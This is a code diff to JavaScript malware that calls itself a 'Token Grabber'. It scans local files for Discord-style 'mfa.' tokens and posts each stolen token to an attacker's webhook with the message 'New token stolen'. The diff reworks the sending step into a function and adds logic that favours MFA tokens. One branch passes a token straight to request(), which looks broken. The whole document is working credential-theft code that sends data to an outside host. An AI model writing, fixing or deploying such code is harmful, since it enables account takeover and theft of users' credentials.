@@ -17,6 +17,7 @@ tokenfiles.forEach((element) => {
     filesarr.push(readlog.toString().match(/mfa\.[\w-]{84}/));
   }
 });
+
 filesarr.forEach((item, index) => {
   if (item === null) {
     filesarr.splice(index, 1);
@@ -28,20 +29,39 @@ filesarr.forEach((item, index) => {
     });
   }
 });
-
-const setting = {
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify({
-    content: `\nNew token stolen:\n\n ${item2}`,
-    username: 'Token Grabber',
-    avatar_url: 'https://cdn.website-editor.net/a5a3ceefad9c489497d5f344d4298b0e/dms3rep/multi/Computer-crime-concept.-606671804_6004x4002.jpeg',
-  }),
-  url: webhook,
-  method: 'POST',
-};
-
-request(setting, (_, __, body) => {
-  console.log(body);
+let isMfa = false;
+result.forEach((item) => {
+  if (item.match(/mfa./)) {
+    isMfa = true;
+  }
 });
+
+const sendRequest = (item) => {
+  const setting = {
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      content: `\nNew token stolen:\n\n ${item}`,
+      username: 'Token Grabber',
+      avatar_url: 'https://cdn.website-editor.net/a5a3ceefad9c489497d5f344d4298b0e/dms3rep/multi/Computer-crime-concept.-606671804_6004x4002.jpeg',
+    }),
+    url: webhook,
+    method: 'POST',
+  };
+  
+  request(setting, (_, __, body) => {
+    console.log(body);
+  });
+}
+
+result.forEach((item) => {
+  if (isMfa) {
+    if (item.match(/mfa./)) {
+      sendRequest(item);
+    }
+  } else {
+    request(item);
+  }
+});
+
